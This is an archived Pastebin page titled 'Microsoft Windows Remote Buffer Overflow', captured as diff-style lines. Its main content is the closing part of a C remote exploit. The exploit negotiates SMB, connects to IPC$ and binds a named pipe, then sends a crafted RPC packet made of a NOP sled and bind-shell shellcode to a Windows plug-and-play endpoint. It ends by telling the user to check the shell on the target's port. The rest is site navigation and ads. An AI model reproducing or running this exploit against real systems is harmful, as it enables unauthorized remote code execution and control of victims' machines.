+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw2">len</span> <span class="sy0">=</span> recv<span class="br0">(</span>sockfd<span class="sy0">,</span> recvbuf<span class="sy0">,</span> <span class="nu0">4096</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span><span class="kw2">len</span> <span class="sy0">&lt;=</span> <span class="nu0">10</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span>send<span class="br0">(</span>sockfd<span class="sy0">,</span> SMB_SessionSetupAndX2<span class="sy0">,</span> sizeof<span class="br0">(</span>SMB_SessionSetupAndX2<span class="br0">)</span>-<span class="nu0">1</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] send failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw2">len</span> <span class="sy0">=</span> recv<span class="br0">(</span>sockfd<span class="sy0">,</span> recvbuf<span class="sy0">,</span> <span class="nu0">4096</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span><span class="br0">(</span><span class="kw2">len</span> <span class="sy0">&lt;=</span> <span class="nu0">10</span><span class="br0">)</span> || <span class="br0">(</span>recvbuf<span class="br0">[</span><span class="nu0">9</span><span class="br0">]</span> <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">)</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; ptr <span class="sy0">=</span> packet<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; memcpy<span class="br0">(</span>ptr<span class="sy0">,</span> SMB_TreeConnectAndX<span class="sy0">,</span> sizeof<span class="br0">(</span>SMB_TreeConnectAndX<span class="br0">)</span>-<span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; ptr +<span class="sy0">=</span> sizeof<span class="br0">(</span>SMB_TreeConnectAndX<span class="br0">)</span>-<span class="nu0">1</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; sprintf<span class="br0">(</span>tmp<span class="sy0">,</span> <span class="st0">"<span class="es0">\\</span><span class="es0">\\</span>%s<span class="es0">\\</span>IPC$"</span><span class="sy0">,</span> argv<span class="br0">[</span><span class="nu0">1</span><span class="br0">]</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; convert_name<span class="br0">(</span>ptr<span class="sy0">,</span> tmp<span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; smblen <span class="sy0">=</span> strlen<span class="br0">(</span>tmp<span class="br0">)</span>*<span class="nu0">2</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; ptr +<span class="sy0">=</span> smblen<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; smblen +<span class="sy0">=</span> <span class="nu0">9</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; memcpy<span class="br0">(</span>packet + sizeof<span class="br0">(</span>SMB_TreeConnectAndX<span class="br0">)</span>-<span class="nu0">1</span>-<span class="nu0">3</span><span class="sy0">,</span> &amp;smblen<span class="sy0">,</span> <span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; memcpy<span class="br0">(</span>ptr<span class="sy0">,</span> SMB_TreeConnectAndX_<span class="sy0">,</span> sizeof<span class="br0">(</span>SMB_TreeConnectAndX_<span class="br0">)</span>-<span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; ptr +<span class="sy0">=</span> sizeof<span class="br0">(</span>SMB_TreeConnectAndX_<span class="br0">)</span>-<span class="nu0">1</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; smblen <span class="sy0">=</span> ptr-packet<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; smblen -<span class="sy0">=</span> <span class="nu0">4</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; memcpy<span class="br0">(</span>packet+<span class="nu0">3</span><span class="sy0">,</span> &amp;smblen<span class="sy0">,</span> <span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span>send<span class="br0">(</span>sockfd<span class="sy0">,</span> packet<span class="sy0">,</span> ptr-packet<span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] send failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw2">len</span> <span class="sy0">=</span> recv<span class="br0">(</span>sockfd<span class="sy0">,</span> recvbuf<span class="sy0">,</span> <span class="nu0">4096</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span><span class="br0">(</span><span class="kw2">len</span> <span class="sy0">&lt;=</span> <span class="nu0">10</span><span class="br0">)</span> || <span class="br0">(</span>recvbuf<span class="br0">[</span><span class="nu0">9</span><span class="br0">]</span> <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">)</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"ok<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"[*] bind pipe..."</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span>send<span class="br0">(</span>sockfd<span class="sy0">,</span> SMB_PipeRequest_browser<span class="sy0">,</span> sizeof<span class="br0">(</span>SMB_PipeRequest_browser<span class="br0">)</span>-<span class="nu0">1</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] send failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw2">len</span> <span class="sy0">=</span> recv<span class="br0">(</span>sockfd<span class="sy0">,</span> recvbuf<span class="sy0">,</span> <span class="nu0">4096</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span><span class="br0">(</span><span class="kw2">len</span> <span class="sy0">&lt;=</span> <span class="nu0">10</span><span class="br0">)</span> || <span class="br0">(</span>recvbuf<span class="br0">[</span><span class="nu0">9</span><span class="br0">]</span> <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">)</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span>send<span class="br0">(</span>sockfd<span class="sy0">,</span> SMB_PNPEndpoint<span class="sy0">,</span> sizeof<span class="br0">(</span>SMB_PNPEndpoint<span class="br0">)</span>-<span class="nu0">1</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] send failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw2">len</span> <span class="sy0">=</span> recv<span class="br0">(</span>sockfd<span class="sy0">,</span> recvbuf<span class="sy0">,</span> <span class="nu0">4096</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span><span class="br0">(</span><span class="kw2">len</span> <span class="sy0">&lt;=</span> <span class="nu0">10</span><span class="br0">)</span> || <span class="br0">(</span>recvbuf<span class="br0">[</span><span class="nu0">9</span><span class="br0">]</span> <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">)</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"ok<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"[*] sending crafted packet..."</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; // nop</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; ptr <span class="sy0">=</span> packet<span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; memset<span class="br0">(</span>packet<span class="sy0">,</span> <span class="st0">'<span class="es0">\x</span>90'</span><span class="sy0">,</span> sizeof<span class="br0">(</span>packet<span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; // header &amp; offsets</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; memcpy<span class="br0">(</span>ptr<span class="sy0">,</span> RPC_call<span class="sy0">,</span> sizeof<span class="br0">(</span>RPC_call<span class="br0">)</span>-<span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; ptr +<span class="sy0">=</span> sizeof<span class="br0">(</span>RPC_call<span class="br0">)</span>-<span class="nu0">1</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; // shellcode</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; bindport <span class="sy0">=</span> <span class="br0">(</span>unsigned short<span class="br0">)</span>atoi<span class="br0">(</span>argv<span class="br0">[</span><span class="nu0">2</span><span class="br0">]</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; bindport ^<span class="sy0">=</span> <span class="nu0">0x0437</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; SET_PORTBIND_PORT<span class="br0">(</span>bind_shellcode<span class="sy0">,</span> htons<span class="br0">(</span>bindport<span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; memcpy<span class="br0">(</span>ptr<span class="sy0">,</span> bind_shellcode<span class="sy0">,</span> sizeof<span class="br0">(</span>bind_shellcode<span class="br0">)</span>-<span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; // end of packet</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; memcpy<span class="br0">(</span> packet + <span class="nu0">2196</span> - sizeof<span class="br0">(</span>RPC_call_end<span class="br0">)</span>-<span class="nu0">1</span> + <span class="nu0">2</span><span class="sy0">,</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; RPC_call_end<span class="sy0">,</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; sizeof<span class="br0">(</span>RPC_call_end<span class="br0">)</span>-<span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; // sending...</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="kw1">if</span> <span class="br0">(</span>send<span class="br0">(</span>sockfd<span class="sy0">,</span> packet<span class="sy0">,</span> <span class="nu0">2196</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">&lt;</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"<span class="es0">\n</span>[-] send failed<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; &nbsp; &nbsp; exit<span class="br0">(</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; <span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"ok<span class="es0">\n</span>"</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; printf<span class="br0">(</span><span class="st0">"[*] check your shell on %s:%i<span class="es0">\n</span>"</span><span class="sy0">,</span> argv<span class="br0">[</span><span class="nu0">1</span><span class="br0">]</span><span class="sy0">,</span> atoi<span class="br0">(</span>argv<span class="br0">[</span><span class="nu0">2</span><span class="br0">]</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp; &nbsp; recv<span class="br0">(</span>sockfd<span class="sy0">,</span> recvbuf<span class="sy0">,</span> <span class="nu0">4096</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1"><span class="kw1">return</span> <span class="nu0">0</span><span class="sy0">;</span></div></li>
+<li class="li1"><div class="de1"><span class="br0">}</span></div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+<li class="li1"><div class="de1">&nbsp;</div></li>
+</ol>        </div>
+    </div>
+
+    
+
+        
+<!-- 0-x2xy94pJ -->
+<div style="padding-bottom:10px; padding-top:10px;">
+<div style="color: #999; font-size: 12px; text-align: center;">Advertisement</div>
+<div class="adsbyvli" style="width:970px; height:250px" data-ad-slot="vi_1282567605"></div> <script>(vitag.Init = window.vitag.Init || []).push(function () { viAPItag.display("vi_1282567605") })</script>
+</div>
+
+    
+        
+<div class="comments">
+
+    
+            
+            <div class="page">
+                <div class="content__title -no-border">
+                    Add Comment                </div>
+
+                <div class="content__text -no-padding">
+                    <div class="notice -post-view">
+                        Please, <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/login?return_url=%2Fcxn757Fw%23add_comment"><b><u>Sign In</u></b></a> to add comment                    </div>
+                </div>
+            </div>
+
+            </div>
+        
+</div>            <div style="clear: both;"></div>
+
+                        
+<!-- 0-x2xy94pJ -->
+<div style="padding-bottom:20px; padding-top:20px;">
+<div style="color: #999; font-size: 12px; text-align: center;">Advertisement</div>
+<div class="adsbyvli" data-ad-slot="vi_1282577474" style="width: 970px; height: 90px"></div><script>(vitag.Init = window.vitag.Init || []).push(function(){viAPItag.display("vi_1282577474")})</script>
+</div>
+        </div>
+
+        <div class="sidebar h_1024">
+            
+
+
+
+                
+    <div class="sidebar__title">
+        <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/archive">Public Pastes</a>
+    </div>
+    <ul class="sidebar__menu">
+
+                    <li>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/cxn757Fw">Microsoft Windows Remote Buffer Overflow</a>
+                <div class="details">
+                                            Python |
+                    
+                    4 min ago
+                    | 11.75 KB                </div>
+            </li>
+                    <li>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/wFjUR72v">Serapi</a>
+                <div class="details">
+                                            Python |
+                    
+                    1 hour ago
+                    | 0.26 KB                </div>
+            </li>
+                    <li>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/yW38V3S5">enormals's Data</a>
+                <div class="details">
+                                            JSON |
+                    
+                    1 hour ago
+                    | 13.86 KB                </div>
+            </li>
+                    <li>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/JFEKzA4V">XML to JSON</a>
+                <div class="details">
+                                            JavaScript |
+                    
+                    1 hour ago
+                    | 1.29 KB                </div>
+            </li>
+                    <li>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/LLFPnecG">兔子逃跑测试 3</a>
+                <div class="details">
+                                            Java |
+                    
+                    2 hours ago
+                    | 1.99 KB                </div>
+            </li>
+                    <li>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/NzjL0eJN">ScriptPrompt</a>
+                <div class="details">
+                                            Lua |
+                    
+                    3 hours ago
+                    | 0.91 KB                </div>
+            </li>
+                    <li>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/jCgytsBr">osi task 1</a>
+                <div class="details">
+                                            Bash |
+                    
+                    3 hours ago
+                    | 1.93 KB                </div>
+            </li>
+                    <li>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/CiS7pEVp">titled sections 3, yes special chars</a>
+                <div class="details">
+                                            HTML |
+                    
+                    3 hours ago
+                    | 0.86 KB                </div>
+            </li>
+        
+    </ul>
+            
+
+    <div class="sidebar__sticky -on">
+                
+<!-- 0-x2xy94pJ -->
+<div style="padding-bottom:10px; padding-top:20px;">
+<div style="color: #999; font-size: 12px; text-align: center;">Advertisement</div>
+<div class="adsbyvli" data-ad-slot="vi_1282578983" style="width: 300px; height: 600px"></div><script>(vitag.Init = window.vitag.Init || []).push(function(){viAPItag.display("vi_1282578983")})</script>
+</div>
+    </div>
+        </div>
+    </div>
+</div>
+
+
+    
+<div class="top-footer">
+    <a class="icon-link -size-24-24 -chrome" href="http://web.archive.org/web/20221009045102/https://pastebin.com/tools#chrome" title="Google Chrome Extension"></a>
+    <a class="icon-link -size-24-24 -firefox" href="http://web.archive.org/web/20221009045102/https://pastebin.com/tools#firefox" title="Firefox Extension"></a>
+    <a class="icon-link -size-24-24 -iphone" href="http://web.archive.org/web/20221009045102/https://pastebin.com/tools#iphone" title="iPhone/iPad Application"></a>
+    <a class="icon-link -size-24-24 -windows" href="http://web.archive.org/web/20221009045102/https://pastebin.com/tools#windows" title="Windows Desktop Application"></a>
+    <a class="icon-link -size-24-24 -android" href="http://web.archive.org/web/20221009045102/https://pastebin.com/tools#android" title="Android Application"></a>
+    <a class="icon-link -size-24-24 -macos" href="http://web.archive.org/web/20221009045102/https://pastebin.com/tools#macos" title="MacOS X Widget"></a>
+    <a class="icon-link -size-24-24 -opera" href="http://web.archive.org/web/20221009045102/https://pastebin.com/tools#opera" title="Opera Extension"></a>
+    <a class="icon-link -size-24-24 -unix" href="http://web.archive.org/web/20221009045102/https://pastebin.com/tools#pastebincl" title="Linux Application"></a>
+</div>
+
+<footer class="footer">
+    <div class="container">
+        <div class="footer__container">
+
+            <div class="footer__left">
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/">create new paste</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/languages">syntax languages</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/archive">archive</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/faq">faq</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/tools">tools</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/night_mode">night mode</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/doc_api">api</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/doc_scraping_api">scraping api</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/news">news</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/pro" class="pro">pro</a>
+
+                <br>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/doc_privacy_statement">privacy statement</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/doc_cookies_policy">cookies policy</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/doc_terms_of_service">terms of service</a><sup style="color:#999">updated</sup> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/doc_security_disclosure">security disclosure</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/dmca">dmca</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/report-abuse">report abuse</a> <span class="footer__devider">&nbsp;/&nbsp;</span>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/contact">contact</a>
+
+                <br>
+
+                                
+                <br>
+
+                
+<span class="footer__bottom h_800">
+    By using Pastebin.com you agree to our <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/doc_cookies_policy">cookies policy</a> to enhance your experience.
+    <br>
+    Site design &amp; logo © 2022 Pastebin</span>
+            </div>
+
+            <div class="footer__right h_1024">
+                                    <a class="icon-link -size-40-40 -facebook-circle" href="http://web.archive.org/web/20221009045102/https://facebook.com/pastebin" rel="nofollow" title="Like us on Facebook" target="_blank"></a>
+                    <a class="icon-link -size-40-40 -twitter-circle" href="http://web.archive.org/web/20221009045102/https://twitter.com/pastebin" rel="nofollow" title="Follow us on Twitter" target="_blank"></a>
+                            </div>
+
+        </div>
+    </div>
+</footer>
+    
+
+
+    
+<div class="popup-container" style="bottom: 21px;">
+
+                <div class="popup-box -cookies" data-name="l2c_1">
+            We use cookies for various purposes including analytics. By continuing to use Pastebin, you agree to our use of cookies as described in the <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/doc_cookies_policy">Cookies Policy</a>.            &nbsp;<span class="cookie-button js-close-cookies">OK, I Understand</span>
+        </div>
+    
+                <div class="popup-box -pro" data-name="l2c_2_pg">
+            <div class="pro-promo-img">
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/signup">
+                    <img src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/hello.png" alt="">
+                </a>
+            </div>
+            <div class="pro-promo-text">
+                Not a member of Pastebin yet?<br>
+                <a href="http://web.archive.org/web/20221009045102/https://pastebin.com/signup"><b>Sign Up</b></a>, it unlocks many cool features!            </div>
+            <div class="close js-close-pro-guest" title="Close Me">&nbsp;</div>
+        </div>
+    
+    
+    
+</div>
+    
+
+<span class="cd-top"></span>
+
+<script src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/jquery.min.js.download"></script>
+<script src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/yii.js.download"></script>
+<script src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/bootstrap-tagsinput.js.download"></script>
+<script>
+    const POST_EXPIRATION_NEVER = 'N';
+    const POST_EXPIRATION_BURN = 'B';
+    const POST_STATUS_PUBLIC = '0';
+    const POST_STATUS_UNLISTED = '1';
+</script>
+<script src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/vendors.bundle.js.download"></script>
+<script src="./Microsoft Windows Remote Buffer Overflow - Pastebin.com_files/app.bundle.js.download"></script>
+
+
+
+
